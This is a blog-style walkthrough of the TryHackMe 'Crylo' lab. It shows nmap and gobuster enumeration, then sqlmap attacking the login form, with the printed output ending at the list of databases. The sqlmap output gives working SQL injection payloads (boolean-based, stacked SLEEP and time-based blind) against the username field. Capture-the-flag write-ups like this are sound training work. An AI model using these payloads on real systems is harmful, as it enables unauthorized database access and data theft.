<p>July 15, 2025 - Day 435</p>
<h1>Crylo</h1>
<p><em>Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.</em>.<br>
https://tryhackme.com/room/crylo4a<br>
<p>Crylo is part of my 435ᵗʰ day on TryHackMe. It is classified as a medium-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click the link below, and let's get started!
Crylo</p>

<br>

<br>

<h2>Task 1 . Enumeration</h2>
<p>You have the IP address of your target. The goal is to find open ports and services to enumerate.</p>
<p><em>Answer the question below</em></p>
<p>1.1. <em>How many ports are open?</em>> Hint : Try using port scanner.<br>
<code>2</code></p>


<br>

<h3>/etc/hosts</h3>
<p>
  
- Added the Target_IP and the domain name crylo.thm to /etc/hosts.</p>

```bash
:~/Crylo# echo 'Target_IP crylo.thm' >> /etc/hosts
```

<h3>nmap</h3>

<p>

  - Used nmap. Identified 2 ports open: 22/ssh , and 80/http.</p>


```bash
:~/Crylo# nmap -v -sC -sV -oN nmap_report.txt crylo.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Spicyo
```

<p>1.2. <em>What is the 403/forbidden web page?</em> Hint : Try directory enumeration.<br>
<code>debug</code></p>

<h3>gobuster</h3>

<p>
  
- Used gobuster to enumerate the directories, and identify the 403 one.</p>

```bash
:~/Crylo# gobuster dir -u http://crylo.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crylo.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 8858]
/about                (Status: 200) [Size: 10720]
/login                (Status: 200) [Size: 13151]
/blog                 (Status: 200) [Size: 11402]
/debug                (Status: 403) [Size: 122]
/recipe               (Status: 200) [Size: 13914]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

<h3>http://crylo.thm/debug</h3>
  
<p>
  
-  Navigated to http://crylo.thm/debug. Indeed it is forbidden.</p>

<img width="1768" height="711" alt="image" src="https://github.com/user-attachments/assets/c2955624-e0cf-41c0-9712-2d5ad69aaac1" />


<br>

<h2>Task 2 . Injection</h2>
<p>The goal is to find a way to bypass the login. Find the username and password.</p>
<p><em>Answer the questions below</em></p>

<p>2.1. <em>What is the name of the first username?</em><br>
<code>admin</code>
  
<h3>http://crylo.thm</h3>

<img width="1769" height="669" alt="image" src="https://github.com/user-attachments/assets/21268d76-9e37-4a33-bfdf-eeb103b4fcd5" />


<h3>http://crylo.thm/login</h3>

<p>- Launched Burp Suite<br>
- Clicked Login<br>
- Enabled FoxyProxy in the right upper corner of the web browser<br>
- Tried to log in with the credentials admin:admin<br>
- Right-clicked over the Burp Suite´s Request  -  using the outcome from the login, clicked Save item, defined the name <code>request</code>, and clicked Save.</p>

<img width="1118" height="592" alt="image" src="https://github.com/user-attachments/assets/4e6a65ef-479c-4194-8ff0-3a8650a1be51" />

<img width="1174" height="371" alt="image" src="https://github.com/user-attachments/assets/d7571bab-aef3-407c-b002-9d6df7e61451" />

<h3>sqlmap</h3>

```bash
:~/Crylo# sqlmap -r request --dbs --batch --level=2 --risk=2
...
[21:00:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:00:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:00:25] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
...
[21:00:39] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[21:00:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:00:49] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:00:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:00:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:00:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:00:50] [INFO] target URL appears to have 11 columns in query
...
[21:01:02] [INFO] target URL appears to be UNION injectable with 11 columns
...
sqlmap identified the following injection point(s) with a total of 459 HTTP(s) requests:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="csrfmiddlewaretoken"

HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="username"

admin' AND 1422=(SELECT (CASE WHEN (1422=1422) THEN 1422 ELSE (SELECT 2938 UNION SELECT 5338) END))-- HuEo
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="password"

admin
-----------------------------30918485911735354248217650571--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="csrfmiddlewaretoken"

HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="username"

admin';SELECT SLEEP(5)#
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="password"

admin
-----------------------------30918485911735354248217650571--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="csrfmiddlewaretoken"

HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="username"

admin' AND (SELECT 3557 FROM (SELECT(SLEEP(5)))kmLc) AND 'gMwA'='gMwA
-----------------------------30918485911735354248217650571
Content-Disposition: form-data; name="password"

admin
-----------------------------30918485911735354248217650571--
---
[21:01:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[21:01:24] [INFO] fetching database names
[21:01:24] [INFO] fetching number of databases
[21:01:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:01:24] [INFO] retrieved: 5
[21:01:25] [INFO] retrieved: mysql
[21:01:27] [INFO] retrieved: information_schema
[21:01:37] [INFO] retrieved: performance_schema
[21:01:46] [INFO] retrieved: sys
[21:01:48] [INFO] retrieved: food
available databases [5]:
[*] food
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```








